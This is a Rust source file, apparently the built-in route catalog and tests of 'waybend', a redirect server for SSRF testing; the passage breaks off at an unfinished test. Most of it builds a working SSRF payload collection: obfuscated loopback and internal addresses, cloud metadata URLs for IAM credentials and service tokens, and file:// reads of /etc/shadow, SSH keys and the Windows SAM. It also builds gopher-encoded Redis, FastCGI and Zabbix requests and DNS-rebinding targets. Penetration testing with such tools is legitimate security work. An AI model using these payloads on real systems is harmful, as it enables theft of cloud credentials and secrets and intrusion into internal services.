use std::{
    collections::{BTreeMap, BTreeSet},
    fmt::Write as _,
    fs,
    path::{Path, PathBuf},
};

use http::{HeaderName, HeaderValue};
use serde::{Deserialize, Serialize};
use thiserror::Error;
use url::Url;

use crate::{
    config::{CatalogConfig, Config},
    engine::render_template,
    model::{CatalogEntry, RequestContext, RouteDefinition},
};

#[derive(Debug, Error)]
pub enum CatalogError {
    #[error("could not read pack {path}: {source}")]
    Read {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
    #[error("invalid YAML pack {path}: {source}")]
    Parse {
        path: PathBuf,
        #[source]
        source: serde_yaml::Error,
    },
    #[error("invalid route {id}: {message}")]
    InvalidRoute { id: String, message: String },
    #[error("duplicate route id `{0}`")]
    DuplicateId(String),
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct PackDefinition {
    pub name: String,
    pub version: String,
    #[serde(default)]
    pub description: String,
    pub routes: Vec<RouteDefinition>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CatalogFilter {
    pub query: Option<String>,
    pub category: Option<String>,
    pub tags: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct Catalog {
    entries: Vec<CatalogEntry>,
    index: BTreeMap<String, usize>,
    known_ids: BTreeSet<String>,
    max_hops: u8,
}

impl Default for Catalog {
    fn default() -> Self {
        Self {
            entries: Vec::new(),
            index: BTreeMap::new(),
            known_ids: BTreeSet::new(),
            max_hops: 32,
        }
    }
}

impl Catalog {
    pub fn load(config: &Config) -> Result<Self, CatalogError> {
        let mut catalog = Self {
            max_hops: config.redirects.max_hops,
            ..Self::default()
        };
        if config.catalog.include_builtin {
            catalog.merge_routes(
                builtin_routes(config),
                "builtin:waybend-0.1".to_owned(),
                &config.catalog,
            )?;
        }
        for path in expand_pack_paths(&config.catalog.external_packs)? {
            catalog.merge_pack_file(&path, &config.catalog)?;
        }
        catalog.sort_and_reindex();
        Ok(catalog)
    }

    pub fn builtin(config: &Config) -> Result<Self, CatalogError> {
        let mut catalog = Self {
            max_hops: config.redirects.max_hops,
            ..Self::default()
        };
        catalog.merge_routes(
            builtin_routes(config),
            "builtin:waybend-0.1".to_owned(),
            &config.catalog,
        )?;
        catalog.sort_and_reindex();
        Ok(catalog)
    }

    pub fn entries(&self) -> &[CatalogEntry] {
        &self.entries
    }

    pub fn get(&self, id: &str) -> Option<&CatalogEntry> {
        self.index.get(id).map(|index| &self.entries[*index])
    }

    pub fn filter(&self, filter: &CatalogFilter) -> Vec<&CatalogEntry> {
        let query = filter
            .query
            .as_ref()
            .map(|query| query.to_ascii_lowercase());
        self.entries
            .iter()
            .filter(|entry| {
                filter
                    .category
                    .as_ref()
                    .is_none_or(|category| entry.category.eq_ignore_ascii_case(category))
            })
            .filter(|entry| {
                filter.tags.iter().all(|tag| {
                    entry
                        .tags
                        .iter()
                        .any(|candidate| candidate.eq_ignore_ascii_case(tag))
                })
            })
            .filter(|entry| {
                query.as_ref().is_none_or(|query| {
                    entry.id.to_ascii_lowercase().contains(query)
                        || entry.title.to_ascii_lowercase().contains(query)
                        || entry.description.to_ascii_lowercase().contains(query)
                        || entry.target.to_ascii_lowercase().contains(query)
                        || entry
                            .tags
                            .iter()
                            .any(|tag| tag.to_ascii_lowercase().contains(query))
                })
            })
            .collect()
    }

    pub fn merge_pack_file(
        &mut self,
        path: &Path,
        filters: &CatalogConfig,
    ) -> Result<(), CatalogError> {
        let yaml = fs::read_to_string(path).map_err(|source| CatalogError::Read {
            path: path.to_path_buf(),
            source,
        })?;
        let pack: PackDefinition =
            serde_yaml::from_str(&yaml).map_err(|source| CatalogError::Parse {
                path: path.to_path_buf(),
                source,
            })?;
        let source = format!("pack:{}@{}", pack.name, pack.version);
        self.merge_routes(pack.routes, source, filters)?;
        self.sort_and_reindex();
        Ok(())
    }

    fn merge_routes(
        &mut self,
        routes: Vec<RouteDefinition>,
        source: String,
        filters: &CatalogConfig,
    ) -> Result<(), CatalogError> {
        let mut seen_in_pack = BTreeSet::new();
        for route in &routes {
            validate_route(route, self.max_hops)?;
            if !seen_in_pack.insert(route.id.clone()) || self.known_ids.contains(&route.id) {
                return Err(CatalogError::DuplicateId(route.id.clone()));
            }
        }
        for route in routes {
            self.known_ids.insert(route.id.clone());
            if !route.enabled || !matches_filters(&route, filters) {
                continue;
            }
            self.index.insert(route.id.clone(), self.entries.len());
            self.entries.push(CatalogEntry {
                id: route.id,
                title: route.title,
                category: route.category,
                description: route.description,
                tags: route.tags,
                target: route.target,
                status: route.status,
                hops: route.hops,
                headers: route.headers,
                source: source.clone(),
            });
        }
        Ok(())
    }

    fn sort_and_reindex(&mut self) {
        self.entries.sort_by(|left, right| left.id.cmp(&right.id));
        self.index = self
            .entries
            .iter()
            .enumerate()
            .map(|(index, entry)| (entry.id.clone(), index))
            .collect();
    }
}

fn expand_pack_paths(paths: &[PathBuf]) -> Result<Vec<PathBuf>, CatalogError> {
    let mut files = Vec::new();
    for path in paths {
        if path.is_dir() {
            let entries = fs::read_dir(path).map_err(|source| CatalogError::Read {
                path: path.clone(),
                source,
            })?;
            for entry in entries {
                let entry = entry.map_err(|source| CatalogError::Read {
                    path: path.clone(),
                    source,
                })?;
                let candidate = entry.path();
                if candidate.is_file()
                    && matches!(
                        candidate.extension().and_then(|value| value.to_str()),
                        Some("yaml" | "yml")
                    )
                {
                    files.push(candidate);
                }
            }
        } else {
            files.push(path.clone());
        }
    }
    files.sort();
    Ok(files)
}

fn matches_filters(route: &RouteDefinition, filters: &CatalogConfig) -> bool {
    !filters.disabled_ids.iter().any(|id| id == &route.id)
        && (filters.enabled_categories.is_empty()
            || filters
                .enabled_categories
                .iter()
                .any(|category| category.eq_ignore_ascii_case(&route.category)))
        && filters.required_tags.iter().all(|tag| {
            route
                .tags
                .iter()
                .any(|candidate| candidate.eq_ignore_ascii_case(tag))
        })
}

fn validate_route(route: &RouteDefinition, max_hops: u8) -> Result<(), CatalogError> {
    let invalid = |message: &str| CatalogError::InvalidRoute {
        id: route.id.clone(),
        message: message.to_owned(),
    };
    if route.id.is_empty()
        || route.id.len() > 96
        || !route
            .id
            .bytes()
            .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'-')
        || route.id.starts_with('-')
        || route.id.ends_with('-')
    {
        return Err(invalid(
            "id must be a lowercase ASCII slug of at most 96 characters",
        ));
    }
    if route.title.trim().is_empty() || route.category.trim().is_empty() {
        return Err(invalid("title and category are required"));
    }
    if route.hops == 0 || route.hops > max_hops {
        return Err(invalid(&format!("hops must be between 1 and {max_hops}")));
    }
    if !matches!(route.status, 301 | 302 | 303 | 307 | 308) {
        return Err(invalid("status is not an HTTP redirect status"));
    }
    let template_context = RequestContext {
        client_ip: "192.0.2.1".into(),
        referer_host: "source.example".into(),
        token: "validation-token".into(),
        public_url: "https://waybend.example".into(),
        query: "token=validation-token".into(),
    };
    let rendered_target = render_template(&route.target, &template_context)
        .map_err(|error| invalid(&format!("invalid target template: {error}")))?;
    let parsed = Url::parse(&rendered_target)
        .map_err(|error| invalid(&format!("invalid target URL: {error}")))?;
    if parsed.scheme().is_empty() {
        return Err(invalid("target URL must include a scheme"));
    }
    for (name, value) in &route.headers {
        HeaderName::from_bytes(name.as_bytes())
            .map_err(|_| invalid("invalid response header name"))?;
        let rendered = render_template(value, &template_context)
            .map_err(|error| invalid(&format!("invalid response header template: {error}")))?;
        HeaderValue::from_str(&rendered).map_err(|_| invalid("invalid response header value"))?;
    }
    Ok(())
}

fn builtin_routes(config: &Config) -> Vec<RouteDefinition> {
    let mut routes = Vec::with_capacity(700);
    add_network_routes(&mut routes, config);
    add_parser_differential_routes(&mut routes, config);
    add_cloud_routes(&mut routes, config);
    add_file_routes(&mut routes, config);
    add_service_routes(&mut routes, config);
    if let Some(domain) = config.dns.domain.as_deref().filter(|_| config.dns.enabled) {
        add_rebind_routes(&mut routes, config, domain.trim_end_matches('.'));
    }
    routes
}

fn route(
    config: &Config,
    id: String,
    title: String,
    category: &str,
    target: String,
    tags: &[&str],
) -> RouteDefinition {
    let description = format!("Redirects to {title}.");
    RouteDefinition {
        id,
        title,
        category: category.to_owned(),
        description,
        tags: tags.iter().map(|tag| (*tag).to_owned()).collect(),
        target,
        status: config.redirects.default_status,
        hops: config.redirects.default_hops,
        headers: BTreeMap::new(),
        enabled: true,
    }
}

fn add_network_routes(routes: &mut Vec<RouteDefinition>, config: &Config) {
    const LOCAL_HOSTS: &[(&str, &str)] = &[
        ("localhost", "localhost"),
        ("localhost-dot", "localhost."),
        ("ipv4-loopback", "127.0.0.1"),
        ("ipv4-short", "127.1"),
        ("ipv4-dword", "2130706433"),
        ("ipv4-hex", "0x7f000001"),
        ("ipv4-octal", "017700000001"),
        ("ipv4-hex-dotted", "0x7f.0x0.0x0.0x1"),
        ("ipv4-octal-dotted", "0177.0.0.1"),
        ("ipv4-padded", "127.000.000.001"),
        ("ipv4-padded-tail", "127.0.0.01"),
        ("ipv4-three-part", "127.0.1"),
        ("ipv4-three-part-wide", "127.0.257"),
        ("ipv4-two-part", "127.65537"),
        ("ipv4-hex-mixed", "0x7f.0.0.1"),
        ("ipv4-hex-short", "0x7f.1"),
        ("ipv4-octal-short", "0177.1"),
        ("ipv4-octal-mixed", "0177.0x0.0.01"),
        ("ipv4-loopback-alt", "127.0.1.1"),
        ("ipv4-loopback-dot", "127.0.0.1."),
        ("ipv4-wildcard", "0.0.0.0"),
        ("ipv4-wildcard-short", "0"),
        ("ipv6-loopback", "[::1]"),
        ("ipv6-v4mapped", "[::ffff:127.0.0.1]"),
        ("ipv6-wildcard", "[::]"),
        ("ipv6-expanded", "[0:0:0:0:0:0:0:1]"),
        ("ipv6-v4hex", "[::ffff:7f00:1]"),
        ("ipv6-v4compatible", "[::127.0.0.1]"),
    ];
    const INTERNAL_HOSTS: &[(&str, &str)] = &[
        ("rfc1918-10", "10.0.0.1"),
        ("rfc1918-10-edge", "10.255.255.254"),
        ("rfc1918-172", "172.16.0.1"),
        ("rfc1918-172-edge", "172.31.255.254"),
        ("rfc1918-192", "192.168.0.1"),
        ("rfc1918-gateway", "192.168.1.1"),
        ("link-local", "169.254.1.1"),
        ("carrier-grade", "100.64.0.1"),
        ("benchmark", "198.18.0.1"),
        ("docker", "172.17.0.1"),
        ("kubernetes", "10.96.0.1"),
        ("multicast-local", "224.0.0.1"),
    ];
    const PATHS: &[(&str, &str)] = &[
        ("root", ""),
        ("admin", "admin"),
        ("login", "login"),
        ("api", "api"),
        ("api-v1", "api/v1"),
        ("debug", "debug"),
        ("metrics", "metrics"),
        ("health", "health"),
        ("status", "status"),
        ("server-status", "server-status"),
        ("actuator", "actuator"),
        ("env", "actuator/env"),
    ];
    for (scope, hosts, category) in [
        ("local", LOCAL_HOSTS, "localhost"),
        ("internal", INTERNAL_HOSTS, "internal-network"),
    ] {
        for (host_id, host) in hosts {
            for (path_id, path) in PATHS {
                routes.push(route(
                    config,
                    format!("{scope}-{host_id}-{path_id}"),
                    format!("{scope} {host_id} {path_id}"),
                    category,
                    format!("http://{host}/{path}"),
                    &[scope, "http", "network"],
                ));
            }
        }
    }
}

fn add_parser_differential_routes(routes: &mut Vec<RouteDefinition>, config: &Config) {
    const TARGETS: &[(&str, &str, &str)] = &[
        (
            "userinfo-host",
            "userinfo before loopback",
            "http://public.example@127.0.0.1/",
        ),
        (
            "userinfo-password",
            "userinfo with password before loopback",
            "http://public.example:443@127.0.0.1/",
        ),
        (
            "userinfo-localhost",
            "loopback userinfo before localhost",
            "http://127.0.0.1@localhost/",
        ),
        (
            "explicit-port-80",
            "loopback with explicit HTTP port",
            "http://127.0.0.1:80/",
        ),
        (
            "explicit-port-443-http",
            "loopback HTTP on port 443",
            "http://127.0.0.1:443/",
        ),
        (
            "https-loopback",
            "loopback over HTTPS",
            "https://127.0.0.1/",
        ),
        (
            "fragment-at-sign",
            "at-sign after loopback fragment",
            "http://127.0.0.1/#@public.example/",
        ),
        (
            "query-at-sign",
            "at-sign after loopback query",
            "http://127.0.0.1/?next=@public.example/",
        ),
    ];
    for (id, title, target) in TARGETS {
        routes.push(route(
            config,
            format!("parser-{id}"),
            (*title).to_owned(),
            "parser-differential",
            (*target).to_owned(),
            &["parser", "url", "differential"],
        ));
    }
}

fn add_cloud_routes(routes: &mut Vec<RouteDefinition>, config: &Config) {
    const CLOUD: &[(&str, &str, &str, &str)] = &[
        (
            "aws-imds-root",
            "AWS IMDS root",
            "aws",
            "http://169.254.169.254/latest/meta-data/",
        ),
        (
            "aws-imds-identity",
            "AWS instance identity",
            "aws",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ),
        (
            "aws-imds-iam",
            "AWS IAM role list",
            "aws",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ),
        (
            "aws-imds-user-data",
            "AWS user data",
            "aws",
            "http://169.254.169.254/latest/user-data",
        ),
        (
            "aws-imds-hostname",
            "AWS hostname",
            "aws",
            "http://169.254.169.254/latest/meta-data/hostname",
        ),
        (
            "aws-imds-ipv6",
            "AWS IMDS IPv6",
            "aws",
            "http://[fd00:ec2::254]/latest/meta-data/",
        ),
        (
            "aws-ecs-v2",
            "AWS ECS credentials v2",
            "aws",
            "http://169.254.170.2/v2/credentials/",
        ),
        (
            "aws-eks-pod-identity",
            "AWS EKS pod identity",
            "aws",
            "http://169.254.170.23/v1/credentials",
        ),
        (
            "gcp-compute-root",
            "GCP metadata root",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/",
        ),
        (
            "gcp-project",
            "GCP project metadata",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/project/",
        ),
        (
            "gcp-instance",
            "GCP instance metadata",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
        ),
        (
            "gcp-service-accounts",
            "GCP service accounts",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        ),
        (
            "gcp-default-token",
            "GCP default service token",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ),
        (
            "gcp-identity",
            "GCP workload identity",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=waybend&format=full",
        ),
        (
            "gcp-dns-alias",
            "GCP numeric metadata endpoint",
            "gcp",
            "http://169.254.169.254/computeMetadata/v1/",
        ),
        (
            "gcp-oslogin",
            "GCP OS Login metadata",
            "gcp",
            "http://metadata.google.internal/computeMetadata/v1/oslogin/users",
        ),
        (
            "azure-imds-instance",
            "Azure instance metadata",
            "azure",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ),
        (
            "azure-imds-identity",
            "Azure managed identity",
            "azure",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F",
        ),
        (
            "azure-imds-attested",
            "Azure attested document",
            "azure",
            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
        ),
        (
            "azure-imds-loadbalancer",
            "Azure load balancer metadata",
            "azure",
            "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01",
        ),
        (
            "azure-imds-scheduledevents",
            "Azure scheduled events",
            "azure",
            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
        ),
        (
            "azure-appservice-msi",
            "Azure App Service identity",
            "azure",
            "http://127.0.0.1:41741/MSI/token?api-version=2019-08-01&resource=https%3A%2F%2Fmanagement.azure.com%2F",
        ),
        (
            "azure-wire-server",
            "Azure wire server",
            "azure",
            "http://168.63.129.16/machine/?comp=goalstate",
        ),
        (
            "azure-host-agent",
            "Azure host agent",
            "azure",
            "http://168.63.129.16:32526/",
        ),
    ];
    for (id, title, provider, target) in CLOUD {
        let item = route(
            config,
            (*id).to_owned(),
            (*title).to_owned(),
            "cloud-metadata",
            (*target).to_owned(),
            &["cloud", provider, "metadata"],
        );
        routes.push(item);
    }
}

fn add_file_routes(routes: &mut Vec<RouteDefinition>, config: &Config) {
    const FILES: &[(&str, &str)] = &[
        ("etc-passwd", "file:///etc/passwd"),
        ("etc-shadow", "file:///etc/shadow"),
        ("etc-hosts", "file:///etc/hosts"),
        ("etc-resolv", "file:///etc/resolv.conf"),
        ("proc-environ", "file:///proc/self/environ"),
        ("proc-cmdline", "file:///proc/self/cmdline"),
        ("proc-mounts", "file:///proc/mounts"),
        ("proc-net-tcp", "file:///proc/net/tcp"),
        ("ssh-host-key", "file:///etc/ssh/ssh_host_rsa_key"),
        ("root-authorized-keys", "file:///root/.ssh/authorized_keys"),
        ("windows-winini", "file:///C:/Windows/win.ini"),
        (
            "windows-hosts",
            "file:///C:/Windows/System32/drivers/etc/hosts",
        ),
        ("windows-sam", "file:///C:/Windows/System32/config/SAM"),
        (
            "windows-system",
            "file:///C:/Windows/System32/config/SYSTEM",
        ),
        (
            "php-filter-index",
            "php://filter/convert.base64-encode/resource=index.php",
        ),
        ("php-input", "php://input"),
        (
            "jar-manifest",
            "jar:file:///app/app.jar!/META-INF/MANIFEST.MF",
        ),
        ("netdoc-passwd", "netdoc:///etc/passwd"),
        ("file-localhost-passwd", "file://localhost/etc/passwd"),
        ("file-loopback-passwd", "file://127.0.0.1/etc/passwd"),
    ];
    for (id, target) in FILES {
        routes.push(route(
            config,
            format!("file-{id}"),
            format!("Local file {id}"),
            "local-file",
            (*target).to_owned(),
            &["file", "local", "read"],
        ));
    }
}

fn add_service_routes(routes: &mut Vec<RouteDefinition>, config: &Config) {
    type LineCommands = (&'static str, u16, &'static [(&'static str, &'static [u8])]);
    const LINE_PROTOCOLS: &[LineCommands] = &[
        (
            "redis",
            6379,
            &[
                ("ping", b"PING"),
                ("info", b"INFO"),
                ("config", b"CONFIG GET *"),
                ("keys", b"KEYS *"),
            ],
        ),
        (
            "memcached",
            11211,
            &[
                ("version", b"version"),
                ("stats", b"stats"),
                ("items", b"stats items"),
                ("slabs", b"stats slabs"),
            ],
        ),
        (
            "zookeeper",
            2181,
            &[
                ("ruok", b"ruok"),
                ("stat", b"stat"),
                ("envi", b"envi"),
                ("conf", b"conf"),
            ],
        ),
        (
            "smtp",
            25,
            &[
                ("hello", b"EHLO waybend.invalid"),
                ("noop", b"NOOP"),
                ("help", b"HELP"),
                ("verify", b"VRFY root"),
            ],
        ),
    ];
    for (service, port, commands) in LINE_PROTOCOLS {
        for (command_id, command) in *commands {
            routes.push(route(
                config,
                format!("gopher-{service}-line-{command_id}"),
                format!("Gopher {service} line command {command_id}"),
                "internal-service",
                gopher_target(*port, command),
                &["gopher", service, "service", "single-line"],
            ));
        }
    }

    const REDIS_COMMANDS: &[(&str, &[&[u8]])] = &[
        ("ping", &[b"PING"]),
        ("info", &[b"INFO"]),
        ("config", &[b"CONFIG", b"GET", b"*"]),
        ("keys", &[b"KEYS", b"*"]),
    ];
    for (id, parts) in REDIS_COMMANDS {
        let payload = redis_resp(parts);
        routes.push(route(
            config,
            format!("gopher-redis-resp-{id}"),
            format!("Gopher Redis RESP {id}"),
            "internal-service",
            gopher_target(6379, &payload),
            &[
                "gopher",
                "redis",
                "resp",
                "binary-selector",
                "client-dependent",
            ],
        ));
    }

    for (id, uri) in [
        ("index", "/index.php"),
        ("status", "/status.php"),
        ("ping", "/ping.php"),
        ("health", "/health.php"),
    ] {
        routes.push(route(
            config,
            format!("gopher-fastcgi-{id}"),
            format!("Gopher FastCGI request {id}"),
            "internal-service",
            gopher_target(9000, &fastcgi_request(uri)),
            &["gopher", "fastcgi", "binary-selector", "client-dependent"],
        ));
    }

    for (id, key) in [
        ("agent-ping", "agent.ping"),
        ("agent-host", "agent.hostname"),
        ("agent-version", "agent.version"),
        ("system-info", "system.uname"),
    ] {
        routes.push(route(
            config,
            format!("gopher-zabbix-{id}"),
            format!("Gopher Zabbix agent {id}"),
            "internal-service",
            gopher_target(10050, &zabbix_passive_check(key)),
            &["gopher", "zabbix", "binary-selector", "client-dependent"],
        ));
    }

    for (id, target) in [
        ("define", "dict://127.0.0.1:2628/d:waybend:*"),
        ("match", "dict://127.0.0.1:2628/m:waybend:*:prefix"),
    ] {
        routes.push(route(
            config,
            format!("dict-{id}"),
            format!("DICT {id} request"),
            "internal-service",
            target.to_owned(),
            &["dict", "dictionary", "service"],
        ));
    }
}

fn percent_encode_octets(bytes: &[u8]) -> String {
    let mut encoded = String::with_capacity(bytes.len() * 3);
    for byte in bytes {
        write!(&mut encoded, "%{byte:02X}").expect("writing to String cannot fail");
    }
    encoded
}

fn gopher_target(port: u16, payload: &[u8]) -> String {
    format!(
        "gopher://127.0.0.1:{port}/_{}",
        percent_encode_octets(payload)
    )
}

fn redis_resp(parts: &[&[u8]]) -> Vec<u8> {
    let mut output = format!("*{}\r\n", parts.len()).into_bytes();
    for part in parts {
        output.extend_from_slice(format!("${}\r\n", part.len()).as_bytes());
        output.extend_from_slice(part);
        output.extend_from_slice(b"\r\n");
    }
    // A Gopher client supplies the final CRLF that terminates its selector.
    output.truncate(output.len() - 2);
    output
}

fn fastcgi_record(record_type: u8, request_id: u16, content: &[u8]) -> Vec<u8> {
    let length = u16::try_from(content.len()).expect("built-in FastCGI record is below 64 KiB");
    let mut record = vec![
        1,
        record_type,
        (request_id >> 8) as u8,
        request_id as u8,
        (length >> 8) as u8,
        length as u8,
        0,
        0,
    ];
    record.extend_from_slice(content);
    record
}

fn fastcgi_pair(output: &mut Vec<u8>, name: &str, value: &str) {
    assert!(name.len() < 128 && value.len() < 128);
    output.push(name.len() as u8);
    output.push(value.len() as u8);
    output.extend_from_slice(name.as_bytes());
    output.extend_from_slice(value.as_bytes());
}

fn fastcgi_request(uri: &str) -> Vec<u8> {
    let mut output = fastcgi_record(1, 1, &[0, 1, 0, 0, 0, 0, 0, 0]);
    let script = format!("/var/www/html{uri}");
    let mut params = Vec::new();
    for (name, value) in [
        ("GATEWAY_INTERFACE", "CGI/1.1"),
        ("REQUEST_METHOD", "GET"),
        ("SCRIPT_FILENAME", script.as_str()),
        ("SCRIPT_NAME", uri),
        ("REQUEST_URI", uri),
        ("QUERY_STRING", ""),
        ("SERVER_PROTOCOL", "HTTP/1.1"),
        ("SERVER_SOFTWARE", "waybend"),
        ("REMOTE_ADDR", "127.0.0.1"),
        ("REMOTE_PORT", "31337"),
        ("SERVER_ADDR", "127.0.0.1"),
        ("SERVER_PORT", "80"),
        ("SERVER_NAME", "localhost"),
        ("CONTENT_LENGTH", "0"),
    ] {
        fastcgi_pair(&mut params, name, value);
    }
    output.extend(fastcgi_record(4, 1, &params));
    output.extend(fastcgi_record(4, 1, &[]));
    // Declare two padding octets on the empty STDIN terminator. The Gopher
    // transport's mandatory trailing CRLF becomes that ignored padding.
    output.extend_from_slice(&[1, 5, 0, 1, 0, 0, 2, 0]);
    output
}

fn zabbix_passive_check(key: &str) -> Vec<u8> {
    let data = format!(r#"{{"request":"passive checks","data":[{{"key":"{key}","timeout":3}}]}}"#);
    // Include the Gopher transport's trailing CRLF as valid JSON whitespace.
    let length = u32::try_from(data.len() + 2).expect("built-in Zabbix request is below 4 GiB");
    let mut output = b"ZBXD\x01".to_vec();
    output.extend_from_slice(&length.to_le_bytes());
    output.extend_from_slice(&[0; 4]);
    output.extend_from_slice(data.as_bytes());
    output
}

fn add_rebind_routes(routes: &mut Vec<RouteDefinition>, config: &Config, domain: &str) {
    const DESTINATIONS: &[(&str, &str, &str)] = &[
        ("root", "", ""),
        ("admin", "", "admin"),
        ("debug", "", "debug"),
        ("metrics", "", "metrics"),
        ("kube-api", ":6443", "api/v1"),
        ("docker-api", ":2375", "containers/json"),
        ("actuator", "", "actuator/env"),
        ("server-status", "", "server-status"),
    ];
    for (id, port, path) in DESTINATIONS {
        for (mode, hostname) in [("alternate", "alt"), ("toctou", "2.toctou")] {
            routes.push(route(
                config,
                format!("rebind-{mode}-{id}"),
                format!("DNS rebind {mode} {id}"),
                "dns-rebind",
                format!("http://{hostname}.{domain}{port}/{path}"),
                &["dns", "rebind", mode, "network"],
            ));
        }
    }
}

#[cfg(test)]
mod tests {
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    #[test]
    fn builtin_catalog_has_exact_stable_shape() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        // 28*12 localhost + 12*12 internal + 8 parser + 24 cloud +
        // 20 file + 30 protocol-aware internal-service routes.
        assert_eq!(catalog.entries().len(), 562);
        assert_eq!(catalog.entries().first().unwrap().id, "aws-ecs-v2");
        assert_eq!(
            catalog.entries().last().unwrap().id,
            "parser-userinfo-password"
        );
        assert!(catalog.get("gopher-redis-line-info").is_some());
        assert!(catalog.get("gopher-redis-resp-info").is_some());
        assert!(catalog.get("gopher-fastcgi-index").is_some());
        assert!(catalog.get("gopher-zabbix-agent-ping").is_some());
        assert!(catalog.get("dict-define").is_some());
        assert!(catalog.get("gcp-default-token").is_some());
        assert!(
            catalog
                .entries()
                .iter()
                .all(|entry| entry.headers.is_empty())
        );
    }

    #[test]
    fn builtin_ids_are_unique_slugs_and_ordered() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        let ids: Vec<_> = catalog.entries().iter().map(|entry| &entry.id).collect();
        assert!(ids.windows(2).all(|pair| pair[0] < pair[1]));
        assert_eq!(ids.iter().collect::<BTreeSet<_>>().len(), 562);
        assert!(ids.iter().all(|id| {
            id.bytes()
                .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'-')
        }));
        assert!(
            catalog
                .entries()
                .iter()
                .all(|entry| entry.source == "builtin:waybend-0.1")
        );
    }

    #[test]
    fn rebind_routes_use_names_understood_by_the_dns_server() {
        let mut config = Config::default();
        config.dns.enabled = true;
        config.dns.domain = Some("rb.example.test".to_owned());
        let catalog = Catalog::builtin(&config).unwrap();
        assert_eq!(catalog.entries().len(), 578);
        assert_eq!(
            catalog.get("rebind-alternate-admin").unwrap().target,
            "http://alt.rb.example.test/admin"
        );
        assert_eq!(
            catalog.get("rebind-toctou-kube-api").unwrap().target,
            "http://2.toctou.rb.example.test:6443/api/v1"
        );
    }

    fn decode_gopher_selector(target: &str) -> Vec<u8> {
        let encoded = target.split_once("/_").unwrap().1.as_bytes();
        assert_eq!(encoded.len() % 3, 0);
        encoded
            .chunks_exact(3)
            .map(|chunk| {
                assert_eq!(chunk[0], b'%');
                let value = std::str::from_utf8(&chunk[1..]).unwrap();
                u8::from_str_radix(value, 16).unwrap()
            })
            .collect()
    }

    #[test]
    fn single_line_gopher_selectors_rely_on_the_protocol_terminator() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        let cases = [
            ("gopher-redis-line-config", b"CONFIG GET *".as_slice()),
            ("gopher-memcached-line-stats", b"stats".as_slice()),
            ("gopher-zookeeper-line-ruok", b"ruok".as_slice()),
            ("gopher-smtp-line-hello", b"EHLO waybend.invalid".as_slice()),
        ];
        for (id, expected) in cases {
            let entry = catalog.get(id).unwrap();
            assert_eq!(decode_gopher_selector(&entry.target), expected);
            assert!(!expected.ends_with(b"\r\n"));
        }
    }

    #[test]
    fn redis_resp_payload_is_a_binary_safe_array_of_bulk_strings() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        let entry = catalog.get("gopher-redis-resp-config").unwrap();
        assert_eq!(
            decode_gopher_selector(&entry.target),
            b"*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$1\r\n*"
        );
        let mut wire = decode_gopher_selector(&entry.target);
        wire.extend_from_slice(b"\r\n");
        assert_eq!(wire, b"*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$1\r\n*\r\n");
        assert!(entry.tags.iter().any(|tag| tag == "client-dependent"));
    }

    #[test]
    fn fastcgi_payload_has_complete_responder_streams() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        let mut payload =
            decode_gopher_selector(&catalog.get("gopher-fastcgi-index").unwrap().target);
        payload.extend_from_slice(b"\r\n");
        let mut cursor = 0;
        let mut types = Vec::new();
        let mut contents = Vec::new();
        while cursor < payload.len() {
            assert_eq!(payload[cursor], 1);
            assert_eq!(&payload[cursor + 2..cursor + 4], &[0, 1]);
            let length = usize::from(u16::from_be_bytes([
                payload[cursor + 4],
                payload[cursor + 5],
            ]));
            let padding = usize::from(payload[cursor + 6]);
            types.push(payload[cursor + 1]);
            contents.push(payload[cursor + 8..cursor + 8 + length].to_vec());
            cursor += 8 + length + padding;
        }
        assert_eq!(types, [1, 4, 4, 5]);
        assert_eq!(contents[0], [0, 1, 0, 0, 0, 0, 0, 0]);
        for needle in [b"REQUEST_METHOD".as_slice(), b"/var/www/html/index.php"] {
            assert!(contents[1].windows(needle.len()).any(|part| part == needle));
        }
        assert!(contents[2].is_empty());
        assert!(contents[3].is_empty());
    }

    #[test]
    fn zabbix_payload_header_length_and_json_match() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        let payload =
            decode_gopher_selector(&catalog.get("gopher-zabbix-agent-ping").unwrap().target);
        assert_eq!(&payload[..5], b"ZBXD\x01");
        let length = u32::from_le_bytes(payload[5..9].try_into().unwrap()) as usize;
        assert_eq!(&payload[9..13], &[0; 4]);
        assert_eq!(length, payload.len() - 13 + 2);
        let mut framed_body = payload[13..].to_vec();
        framed_body.extend_from_slice(b"\r\n");
        let body: serde_json::Value = serde_json::from_slice(&framed_body).unwrap();
        assert_eq!(body["request"], "passive checks");
        assert_eq!(body["data"][0]["key"], "agent.ping");
        assert_eq!(body["data"][0]["timeout"], 3);
    }

    #[test]
    fn dict_routes_use_rfc_2229_url_operations() {
        let catalog = Catalog::builtin(&Config::default()).unwrap();
        assert_eq!(
            catalog.get("dict-define").unwrap().target,
            "dict://127.0.0.1:2628/d:waybend:*"
        );
        assert!(catalog.get("dict-redis-ping").is_none());
    }

    #[test]
